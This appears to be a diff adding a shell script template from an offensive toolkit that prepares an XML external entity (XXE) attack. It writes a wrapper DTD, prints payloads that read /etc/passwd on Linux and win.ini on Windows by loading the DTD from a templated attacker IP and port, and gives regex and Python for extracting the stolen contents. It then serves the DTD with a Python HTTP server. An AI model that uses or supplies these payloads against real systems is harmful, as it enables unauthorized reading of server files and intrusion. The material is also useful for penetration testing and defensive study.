@@ -1,0 +1,30 @@
+mkdir -p packstation/outbound; \
+echo '<!ENTITY wrapper "%start;%file;%end;">' > packstation/outbound/wrapper.dtd; \
+echo '================================================================'; \
+echo '                      -----Linux-----                      '; \
+echo 'Suggested payload for reading /etc/passwd'; \
+echo '<!DOCTYPE data ['; \
+echo '<!ENTITY % start "<![CDATA[DELIMITER_BEFORE_FILE">'; \
+echo '<!ENTITY % file SYSTEM "file:///etc/passwd" >'; \
+echo '<!ENTITY % end "DELIMITER_AFTER_FILE]]>">'; \
+echo '<!ENTITY % dtd SYSTEM "<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/wrapper.dtd">'; \
+echo '%dtd;'; \
+echo ']>'; \
+echo '================================================================'; \
+echo '                      -----Windows-----                      '; \
+echo 'Suggested payload for reading C:\Windows\win.ini'; \
+echo '<!DOCTYPE data ['; \
+echo '<!ENTITY % start "<![CDATA[DELIMITER_BEFORE_FILE">'; \
+echo '<!ENTITY % file SYSTEM "file://C:\Windows\win.ini" >'; \
+echo '<!ENTITY % end "DELIMITER_AFTER_FILE]]>">'; \
+echo '<!ENTITY % dtd SYSTEM "<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/wrapper.dtd">'; \
+echo '%dtd;'; \
+echo ']>'; \
+echo '================================================================'; \
+echo '                      ------RegEx------                      '; \
+echo 'To filter out file contents in the response:'; \
+echo 'DELIMITER_BEFORE_FILE(.*?)DELIMITER_AFTER_FILE'; \
+echo 'Directly in python:'; \
+echo 're.findall(r\'DELIMITER_BEFORE_FILE(.*?)DELIMITER_AFTER_FILE\', response_text, flags = re.DOTALL)'; \
+echo '================================================================'; \
+python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
